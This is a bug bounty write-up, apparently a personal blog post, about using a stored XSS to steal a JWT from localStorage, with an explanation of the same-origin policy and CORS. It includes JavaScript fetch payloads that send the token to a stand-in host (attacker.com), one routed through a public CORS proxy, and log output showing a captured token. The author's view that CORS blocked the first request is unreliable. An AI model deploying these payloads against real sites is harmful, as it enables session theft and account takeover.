---
layout: post
title: "On SOP, CORS, and the Hows of Exfiltrating JWTs via XSS"
author: "BoT"
tags: "bugbounty"
excerpt_separator: <!--more-->
---

In order words: how to not get c\*\*k-blocked by CORS.

<!--more-->

## Background

I recently found a stored Cross-site Scripting (XSS) vulnerability while hunting at a target.

While the bug class itself is not particularly spectacular, what interested me was on _what_ I could do with it.

Showing an alert popup is fine and all, but impact of that level would likely only net me a `Medium` in severity at HackerOne. To justify for anything higher, I have to get creative on showing its potential disastrous impact.

Given that this is a stored XSS, I thought to myself:

> What if I demonstrate that an attacker can essentially harvest credentials from any authenticated user who browses the affected page? In that case, mass account takeovers would be trivial!

An idea worth trying out, especially since the application stores the value of its JWT in the browser's `localStorage` as `token`.

I can simply swap out the typical payload of `alert(document.domain)` with one that retrieves the token and makes a GET request to a server under my control.

Just like this; and that should be it... right?

```javascript
fetch("https://attacker.com:8000/jwt=" + JSON.stringify(localStorage.getItem("token")));
```

Nope-- what greeted me was this sad little error message in the console instead:

> Access to fetch at 'https://attacker.com:8000/?jwt=xxx' from origin 'https://example.redacted.com' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.

Very sad indeed.

## What in the world is CORS???

Now, before we go into that, let's first understand what is **Same-Origin Policy** (SOP).

Long story short, SOP prevents one origin from accessing resources of another origin.

Origin here is defined as `protocol://hostname:port`. In other words, in order for one origin to be considered the same as another origin, the values of these three variables must be _exactly_ the same.

Let's take `https://example.com/latest` as an example:

- `http://example.com/myinfo` is allowed because they are of the same origin
- `http://example.com/users.json` is blocked because they are of different protocol and port
- `https://api.example.com/info` is blocked because they are of different domain
- `https://example.com:8443/files` is blocked because they are of different port

One might say:

> But `img` tag can still load images despite not being the same origin!

That is correct -- because SOP only prevents browser's JavaScript engine from reading the contents of a response, it _does_ allow the resource to be loaded onto the DOM of the page.

To reiterate, the purpose of SOP is not to prevent request for a resources from being sent. In fact, in the prior example, all of the requests would be sent, it is just that `https://example.com/latest` wouldn't be able to read the response of those marked as blocked.

With the rise of micro-services, strict SOP policies like these are just too stifling for developers, which leads us to **Cross-Origin Policy** (CORS).

Simply put, CORS helps to relax these restrictions by instructing the browser on which origin are allowed to access their resources via headers.

The most common CORS-related headers are:

- `Access-Control-Allow-Origin` that specifies which origin can access the response
- `Access-Control-Allow-Credentials` that indicates if the request can include cookies
- `Access-Control-Expose-Headers` that instructs the browser to expose certain headers to JavaScript

If resources from `https://example.com/` were to be successfully loaded by `https://api.example.com/`, the response of the latter must have the following CORS header:

```
Access-Control-Allow-Origin: https://example.com
```

And this is why we had our little error: our `https://attacker.com/` doesn't return the necessary CORS header to allow our XSS payload to do its magic.

## Okay... how do we solve this?

> Wait a sec-- didn't you say that requests would still be sent? You should be able to see the incoming request which would have the JWT you sent!

Well, yes.

The request was indeed sent, but that didn't mean the delivered content was legible from the web server. In fact, it was a bunch of truly horrible-looking `400 Bad Request` errors.

```bash
bot@bucketoftears:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
██████████ -- [16/Mar/2023 12:57:58] code 400, message Bad request version ('ô<\x00"\x13\x01\x13\x03\x13\x02À+À/Ì©Ì¨À,À0À')
██████████ -- [16/Mar/2023 12:57:58] "ü_ÆoTmç¸Æ<&°ø`«6ß¸ÍòëH ¹3E&z×vø¾ú®^umrÒ}³J  ô<"À+À/Ì©Ì¨À,À0À" 400 -
██████████ -- [16/Mar/2023 12:57:58] code 400, message Bad request version ('}Å|\x00"\x13\x01\x13\x03\x13\x02À+À/Ì©Ì¨À,À0À')
██████████ -- [16/Mar/2023 12:57:58] "ü0!>Êó*!SEu´cj<ºaaÅ3ãqH· â3qøÂµßS02§[¾(dà¥ÃGz|_t}Å|"À+À/Ì©Ì¨À,À0À" 400 -
```

No amount of Googling had enlightened me on what-the-loving-f\*\*k is happening here (probably something to do with that missing CORS header), so I moved on to my next brilliant idea -- using CORS proxies!

A CORS proxy essentially acts as an intermediary that helpfully adds the required `Access-Control-Allow-Origin` header. It's easy -- doesn't require server setups of any kind -- and already has many instances online for immediate use (e.g. `CORS Anywhere`, `alloworigin`).

One just needs to prefix the chosen proxy's URL to `https://attacker.com` and the proxy in question will:

1. Forward the request to `https://attacker.com`
2. Add the `Access-Control-Allow-Origin` header to the response from `https://attacker.com`
3. Passes that response, with that added header, back to the requesting `https://attacker.com`

Sounds simple!

Now, let's try this out on the XSS payload...

```javascript
fetch(
  "https://api.allorigins.win/get?url=https://attacker.com:8000/jwt=" +
    JSON.stringify(localStorage.getItem("token"))
);
```

... voilà, the JWT we are looking for on our web server!

```bash
bot@bucketoftears:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
██████████ - - [16/Mar/2023 13:34:48] code 404, message File not found
██████████ - - [16/Mar/2023 13:34:48] "GET /%22eyJ0eXAiOiJKV1Q█████████.eyJhdWQiOiJiMjg█████████.Vnm3IUUeydxCItX█████████%22 HTTP/1.1" 404 -
```

## Conclusion

Ultimately, this vulnerability was triaged as `Medium` in severity. While disappointing, it was a good revision of the SOP and CORS concepts. In my opinion, it was a net gain.

Funny enough, it wasn't until everything was said and done that I realized scripts like [khalidx/simple_http_server_cors.py](https://gist.github.com/khalidx/6d6ebcd66b6775dae41477cffaa601e5) exist. Instead of resolving the CORS error in such a roundabout way, I could have just leached onto open-source tools that were already available.

Oh well.

## References

- My very expensive OSWE course-book 🙃
- [StackOverflow - Trying to use fetch and pass in mode: no-cors](https://stackoverflow.com/questions/43262121/trying-to-use-fetch-and-pass-in-mode-no-cors)
